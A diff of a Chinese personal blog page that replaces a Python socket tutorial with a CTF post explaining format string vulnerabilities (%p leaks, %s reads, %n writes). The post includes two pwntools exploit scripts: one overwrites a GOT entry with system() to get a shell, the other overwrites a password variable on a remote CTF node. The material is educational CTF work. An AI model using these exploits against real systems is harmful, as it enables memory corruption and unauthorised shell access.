@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   
-  <title>Tag: 网络编程 python | huzai9527&#39;s personal blog</title>
+  <title>PWN-格式化字符串原理 | huzai9527&#39;s personal blog</title>
   
   
 
@@ -159,25 +159,12 @@
 
   <div class="l_body nocover">
     <div class='body-wrapper'>
-      
-<div class="l_main">
+      <div class="l_main">
   
-    
-      
-  <section class="post-list">
-    
-      
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class="post-wrapper">
-            <article class="post reveal ">
+
   
+    <article id="post" class="post white-box article-type-post" itemscope="" itemprop="blogPost">
+      
 
 
   <section class="meta">
@@ -186,11 +173,13 @@
     <div class="meta" id="header-meta">
       
         
-  <h2 class="title">
-    <a href="/2020/07/08/python网络编程/">
-      python网络编程
-    </a>
-  </h2>
+  
+    <h1 class="title">
+      <a href="/2020/12/12/PWN-格式化字符串原理/">
+        PWN-格式化字符串原理
+      </a>
+    </h1>
+  
 
 
       
@@ -216,7 +205,7 @@
             <div class="new-meta-item date">
   <a class="notlink">
     <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2020-07-08</p>
+    <p>2020-12-12</p>
   </a>
 </div>
 
@@ -229,6 +218,19 @@
         
           
             
+  
+    <div class="new-meta-item browse busuanzi">
+      <a class="notlink">
+        <i class="fas fa-eye" aria-hidden="true"></i>
+        <p>
+          <span id="busuanzi_value_page_pv">
+            <i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i>
+          </span>
+        </p>
+      </a>
+    </div>
+  
+
 
           
         
@@ -245,55 +247,181 @@
   </section>
 
 
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      <h2 id="套接字类型"><a href="#套接字类型" class="headerlink" title="套接字类型"></a>套接字类型</h2><h3 id="面向连接的套接字"><a href="#面向连接的套接字" class="headerlink" title="面向连接的套接字"></a>面向连接的套接字</h3><pre><code>- 基于TCP/IP，使用SOCKET_STREAM作为套接字类型
-</code></pre><h3 id="无连接的套接字"><a href="#无连接的套接字" class="headerlink" title="无连接的套接字"></a>无连接的套接字</h3><pre><code>- 基于UDP/IP，使用SOCKET_DGRAM作为套接字类型
-</code></pre><h2 id="pyhton中的网络编程"><a href="#pyhton中的网络编程" class="headerlink" title="pyhton中的网络编程"></a>pyhton中的网络编程</h2><h3 id="socket模块"><a href="#socket模块" class="headerlink" title="socket模块"></a>socket模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(socket_family, socket_type, protocol = <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>其中socket_family 是选择网络类型,本地网（AF_UNIX）还是因特网(AF_INET)</li>
-<li><p>socket_type 是选择套接字的类型, protocaol默认为0</p>
-<h3 id="套接字对象常用的方法"><a href="#套接字对象常用的方法" class="headerlink" title="套接字对象常用的方法"></a>套接字对象常用的方法</h3><ul>
-<li>服务器套接字<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s.bind() <span class="comment">#将主机号端口号绑定到套接字上</span></span><br><span class="line">s.listen() <span class="comment">#设置并启动TCP监听器</span></span><br><span class="line">s.accept() <span class="comment">#被动接受客户端连接</span></span><br></pre></td></tr></table></figure>
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          <h2 id="格式化字符串原理"><a href="#格式化字符串原理" class="headerlink" title="格式化字符串原理"></a>格式化字符串原理</h2><h3 id="1-format-string"><a href="#1-format-string" class="headerlink" title="1.format string"></a>1.format string</h3><ul>
+<li>print家族函数接受变长的字符串,其中第一个参数就是format string,后面的参数在实际运行中将与之对应</li>
+<li>format string符号说明<ul>
+<li>%P  将对应的参数解析为地址形式输出</li>
+<li>%K$P 对应格式化字符串后的第K个参数,并以地址形式输出</li>
+<li>%K$n 与格式化字符串后的第K个参数对应,将参数解析为一个地址,并取消此次输出,而将已经输出的字节长度写入获取的地址<ul>
+<li>预调用约定</li>
+<li>printf的参数按照参数的顺序依次存放在栈上的(32位)</li>
+<li>对于64位机,前六个参数存放在相应的寄存器中</li>
+</ul>
 </li>
+</ul>
+</li>
+</ul>
+<h3 id="2-格式化字符串漏洞"><a href="#2-格式化字符串漏洞" class="headerlink" title="2.格式化字符串漏洞"></a>2.格式化字符串漏洞</h3><h4 id="1-内存泄漏-p"><a href="#1-内存泄漏-p" class="headerlink" title="1.内存泄漏(%p)"></a>1.内存泄漏(%p)</h4><ul>
+<li>当format string中的符号个数超过参数的个数时,printf会根据调用约定到,栈上(reg)中取值</li>
+<li>因此当我们不向printf提供更多参数时,prinf会打印出栈上本不应该被访问的值</li>
+</ul>
+<h4 id="2-任意地址泄漏-7-s"><a href="#2-任意地址泄漏-7-s" class="headerlink" title="2.任意地址泄漏(%7$s)"></a>2.任意地址泄漏(%7$s)</h4><ul>
+<li>类似这样的构造会造成栈上第 7+1 个参数,所在的地址被解析,读取该地址指向的字符串</li>
+</ul>
+<h4 id="3-内存覆盖-k-n"><a href="#3-内存覆盖-k-n" class="headerlink" title="3. 内存覆盖(%k$n)"></a>3. 内存覆盖(%k$n)</h4><ul>
+<li>需要清楚的是把什么值输出到哪里去?<pre><code>- 首先,写入的是%之前的字节数
+</code></pre><ul>
+<li>其次写入的目的地是?<pre><code>- %n对当前偏移指向的那块空间存储的指针指向的空间写入数字,并取消此次输出
+- 因此,写入的地址为,用户输入的地址des(当然,需要加偏移)
+- 比如说你输入了一个地址,此时会有一个地址(tmp)储存你输入的地址(des),而format string 作为一个参数,在函数栈中是有地址的,而由于格式化符号大于输入参数的个数,因此函数栈中会有很多的地址存储,因此需要通过偏移量找到用户输入的地址(des),并向des指向的空间写入%之前的字节数
+</code></pre></li>
 </ul>
 </li>
 </ul>
 <ul>
-<li>客户端套接字<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s.connect() <span class="comment">#主动发起TCP服务连接</span></span><br><span class="line">s.connect_ex() <span class="comment">#此时会以错误码的形式抛出问题而不是一大串异常</span></span><br></pre></td></tr></table></figure>
+<li><p>实现任意地址写入</p>
+<ul>
+<li><p>如何实现向任意地址写入任意字符串?</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=fmtstr_payload(10,&#123;atoi_got:system_plt&#125;)</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<h3 id="创建一个时间戳服务器"><a href="#创建一个时间戳服务器" class="headerlink" title="创建一个时间戳服务器"></a>创建一个时间戳服务器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line">HOST = <span class="string">''</span></span><br><span class="line">PORT = <span class="number">23456</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line">BUFSIZE = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">tcpSerSocket = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">tcpSerSocket.bind(ADDR)</span><br><span class="line">tcpSerSocket.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    print(<span class="string">"waiting for connection ..."</span>)</span><br><span class="line">    tcpCliSocket, addr = tcpSerSocket.accept()</span><br><span class="line">    print(<span class="string">"connected from:"</span>, addr)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        data = tcpCliSocket.recv(BUFSIZE)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tcpCliSocket.send(data+<span class="string">b' time now:'</span>+bytes(ctime(), <span class="string">'utf-8'</span>))</span><br><span class="line">    tcpCliSocket.close()</span><br><span class="line">tcpSerSocket.close()</span><br></pre></td></tr></table></figure>
-<h3 id="创建一个客户机"><a href="#创建一个客户机" class="headerlink" title="创建一个客户机"></a>创建一个客户机</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line">HOST = <span class="string">"192.168.0.118"</span></span><br><span class="line">PORT = <span class="number">23456</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line">BUFSIZE = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">tcpCliSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpCliSocket.connect(ADDR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    data = input(<span class="string">'&gt; '</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-各种格式化字符含义"><a href="#4-各种格式化字符含义" class="headerlink" title="4.各种格式化字符含义"></a>4.各种格式化字符含义</h4><p>%c：输出字符，配上%n可用于向指定地址写数据。</p>
+<p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p>
+<p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p>
+<p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p>
+<p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p>
+<p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x%10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</p>
+<h3 id="3-实例"><a href="#3-实例" class="headerlink" title="3.实例"></a>3.实例</h3><h4 id="1-向got表中写入system的plt地址"><a href="#1-向got表中写入system的plt地址" class="headerlink" title="1.向got表中写入system的plt地址"></a>1.向got表中写入system的plt地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn5'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn5'</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#这就是如何向任意地址空间写入任意数据</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="2-向某个空间写入具体数据"><a href="#2-向某个空间写入具体数据" class="headerlink" title="2.向某个空间写入具体数据"></a>2.向某个空间写入具体数据</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26486</span>)</span><br><span class="line"></span><br><span class="line">unk_804C044 = <span class="number">0x0804C044</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;unk_804C044:<span class="number">0x1111</span>&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">"your name:"</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">"your passwd"</span>,str(<span class="number">0x1111</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        </div>
+        
+          
 
+
+  <section class="meta" id="footer-meta">
+    <hr>
+    <div class="new-meta-box">
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-12-12T13:25:22+08:00">
+  <a class="notlink">
+    <i class="fas fa-clock" aria-hidden="true"></i>
+    <p>last updated at Dec 12, 2020</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/PWN-CTF/" rel="nofollow"><i class="fas fa-hashtag" aria-hidden="true"></i>&nbsp;<p>PWN CTF</p></a></div>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="QQ好友" rel="external nofollow noopener noreferrer" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2020/12/12/PWN-格式化字符串原理/&title=PWN-格式化字符串原理 | huzai9527's personal blog&summary=">
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="QQ空间" rel="external nofollow noopener noreferrer" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/12/12/PWN-格式化字符串原理/&title=PWN-格式化字符串原理 | huzai9527's personal blog&summary=">
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="微博" rel="external nofollow noopener noreferrer" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2020/12/12/PWN-格式化字符串原理/&title=PWN-格式化字符串原理 | huzai9527's personal blog&summary=">
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
       
     </div>
-    
-      <div class="full-width auto-padding tags">
-        
-          <a href="/tags/网络编程-python/" rel="nofollow"><i class="fas fa-hashtag fa-fw"></i>网络编程 python</a>
-        
-      </div>
-    
   </section>
-</article>
 
-          </div>
+
         
-      
-    
-  </section>
+        
+            <div class="prev-next">
+                
+                
+                    <section class="next">
+                        <span class="art-item-right" aria-hidden="true">
+                            <h6>Next&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i></h6>
+                            <h4>
+                                <a href="/2020/12/12/PWN-缓冲区溢出原理/" rel="prev" title="PWN-缓冲区溢出原理">
+                                    
+                                        PWN-缓冲区溢出原理
+                                    
+                                </a>
+                            </h4>
+                            
+                                
+                                <h6 class="tags">
+                                    <a class="tag" href="/tags/PWN-CTF/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>PWN CTF</a>
+                                </h6>
+                            
+                        </span>
+                    </section>
+                
+            </div>
+        
+      </section>
+    </article>
   
-    
-    <!-- 根据主题中的设置决定是否在archive中针对摘要部分的MathJax公式加载mathjax.js文件 -->
-    
-    
+
+  
+    <!-- 显示推荐文章和评论 -->
+
+
 
   
 
 
-    
   
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+
+  <script>
+    window.subData = {
+      title: 'PWN-格式化字符串原理',
+      tools: true
+    }
+  </script>
+
+
 </div>
 <aside class="l_side">
   
